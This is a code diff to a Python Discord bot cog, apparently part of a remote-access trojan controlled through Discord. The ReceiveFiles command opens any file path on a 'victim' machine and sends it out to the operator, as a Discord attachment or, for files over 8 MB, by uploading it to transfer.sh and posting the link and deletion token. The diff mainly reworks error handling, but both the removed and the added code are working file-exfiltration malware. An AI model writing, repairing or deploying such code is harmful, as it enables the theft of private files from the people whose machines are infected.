@@ -25,8 +25,8 @@ class ReceiveFiles(commands.Cog):
             if '"' in file_path:
                 file_path = file_path.replace('"', "")
             try:
-                f = open(file_path, "rb")
-            except:  # noqa: E722
+                file_size = os.path.getsize(file_path)
+            except OSError:
                 return await ctx.followup.send(
                     embed=self.bot.genEmbed(
                         "File was not found!",
@@ -35,28 +35,57 @@ class ReceiveFiles(commands.Cog):
                     )
                 )
 
-            if os.path.getsize(file_path) < 8388608:
-                return await ctx.followup.send(
+            if file_size < 8388608:
+                try:
+                    with open(file_path, "rb") as f:
+                        return await ctx.followup.send(
+                            embed=self.bot.genEmbed(
+                                "Received file from victim", datetime.now()
+                            ),
+                            file=discord.File(
+                                f, os.path.basename(file_path)
+                            ),
+                        )
+                except OSError:
+                    return await ctx.followup.send(
+                        embed=self.bot.genEmbed(
+                            "File was not found!",
+                            datetime.now(),
+                            "Please specify a different path and try again",
+                        )
+                    )
+
+            try:
+                with open(file_path, "rb") as f:
+                    file = {"{}".format(file_path): f}
+                    response = requests.post(
+                        "https://transfer.sh/", files=file
+                    )
+                download_link = response.content.decode("utf-8")
+                deletion_token = response.headers.get("X-Url-Delete")
+
+                deletion_token = deletion_token.replace(
+                    download_link.rstrip() + "/", ""
+                )
+
+                await ctx.followup.send(
                     embed=self.bot.genEmbed(
-                        "Received file from victim", datetime.now()
-                    ),
-                    file=discord.File(file_path),
+                        "Received file from victim",
+                        datetime.now(),
+                        "Link:\n"
+                        + download_link
+                        + "\nDeletion token:\n"
+                        + deletion_token,
+                    )
                 )
-
-            file = {"{}".format(file_path): f}
-            response = requests.post("https://transfer.sh/", files=file)
-            download_link = response.content.decode("utf-8")
-            deletion_token = response.headers.get("X-Url-Delete")
-
-            deletion_token = deletion_token.replace(download_link.rstrip() + "/", "")
-
-            await ctx.followup.send(
-                embed=self.bot.genEmbed(
-                    "Received file from victim",
-                    datetime.now(),
-                    "Link:\n" + download_link + "\nDeletion token:\n" + deletion_token,
+            except OSError:
+                await ctx.followup.send(
+                    embed=self.bot.genEmbed(
+                        "File was not found!",
+                        datetime.now(),
+                        "Please specify a different path and try again",
+                    )
                 )
-            )
 
 
 def setup(bot: commands.Bot):
